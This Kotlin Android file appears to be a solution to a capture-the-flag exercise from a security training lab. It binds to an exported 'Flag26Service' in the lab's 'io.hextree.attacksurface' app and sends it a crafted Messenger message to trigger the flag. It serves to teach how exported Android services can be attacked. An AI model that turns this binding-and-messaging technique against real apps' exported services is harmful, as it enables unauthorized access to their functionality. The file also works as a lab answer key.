package com.example.myapplication

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.os.Bundle
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.Message
import android.os.Messenger
import android.os.RemoteException
import android.util.Log

class ServiceClient(
    private val context: Context,
    private val onResponse: (Message) -> Unit
) {
    private class IncomingHandler(
        private val onResponse: (Message) -> Unit
    ) : Handler(Looper.getMainLooper()) {
        override fun handleMessage(msg: Message) {
            onResponse(msg)
        }
    }

    private val clientMessenger = Messenger(IncomingHandler(onResponse))
    private var serviceMessenger: Messenger? = null
    private var isBound = false

    private val serviceConnection = object : ServiceConnection {
        override fun onServiceConnected(name: ComponentName, service: IBinder) {
            serviceMessenger = Messenger(service)
            isBound = true
            Log.i("ServiceClient", "Connected to $name, sending message...")
            // ابعت الرسالة فورًا بعد ما يتأكد الاتصال
            send(42)
        }

        override fun onServiceDisconnected(name: ComponentName) {
            serviceMessenger = null
            isBound = false
        }
    }

    fun bind() {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.services.Flag26Service"
            )
        }
        context.bindService(
            intent,
            serviceConnection,
            Context.BIND_AUTO_CREATE
        )
    }

    fun unbind() {
        if (isBound) {
            context.unbindService(serviceConnection)
            isBound = false
            serviceMessenger = null
        }
    }

    fun send(what: Int, data: Bundle? = null) {
        val messenger = serviceMessenger ?: return
        val msg = Message.obtain(null, what).apply {
            replyTo = clientMessenger
            data?.let { this.data = it }
        }
        try {
            messenger.send(msg)
        } catch (e: RemoteException) {
            Log.e("ServiceClient", "Failed to send message", e)
        }
    }
}